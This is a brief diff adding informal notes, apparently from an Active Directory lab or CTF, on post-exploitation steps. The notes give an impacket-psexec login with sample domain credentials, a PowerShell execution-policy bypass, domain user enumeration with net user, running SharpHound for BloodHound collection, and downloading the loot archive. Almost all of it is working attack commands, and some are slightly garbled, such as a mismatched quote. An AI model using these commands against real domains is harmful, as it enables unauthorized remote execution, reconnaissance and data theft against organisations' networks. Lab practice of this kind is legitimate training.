@@ -1,0 +1,15 @@
+connect  to ssh or rdp  --------------
+impacket-psexec 'DOMAIN_NAME/domain_user:password@ipaddress'
+in my case :-------
+
+impacket-psexec 'FRIENDS/rgeller:Password123!@#@10.10.10.10
+powershell -ep bypass
+net user /domain
+net user rgeller /domain
+
+now use bloodhound tool:------------------
+IMPORT-MODULE ./SharpHound.exe
+./SharpHound.exe
+
+file create in .kirbi format zip file now download file in your local system
+lget loot.zip
